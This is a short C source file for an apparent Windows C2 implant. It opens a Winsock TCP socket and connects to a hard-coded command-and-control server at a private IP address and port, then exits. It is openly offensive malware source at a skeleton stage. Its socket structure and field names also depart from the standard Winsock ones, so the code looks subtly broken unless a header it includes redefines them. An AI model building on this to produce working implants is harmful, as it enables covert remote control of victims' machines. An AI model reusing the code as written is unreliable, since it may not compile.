#include <stdio.h>
#include <winsock2.h>
#include "implant.h"

#pragma comment(lib,"ws2_32.lib") //Winsock Library

int main() {

	WSADATA wsa;
	SOCKET implant_socket;
	struct socket_address_in server;

	printf("Initialising Winsock...\n");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{	
		printf("Failed. Error Code : %d", WSAGetLastError());
		return 1;
	}

	printf("Initialised.\n");
	printf("The implant is up and running!\n");
	implant_socket = socket(AF_INET, SOCK_STREAM, 0);


	if (implant_socket == INVALID_SOCKET) {
		printf("We could not crearte the socket: %d\n", WSAGetLastError());
	}
    
	printf("Socket created!\n");

	server.socket_in_address.s_un.s_address= inet_addr("172.16.49.90");
	server.socket_family = AF_INET;
	server.socket_port = htons(61110);

	// Connect to the C2 server
	if (connect(implant_socket, (struct socket_address*) & server, sizeof(server)) < 0) {
		puts("Connect error");

		return 1;
	}

	puts("Connected");
	
    return 0;
}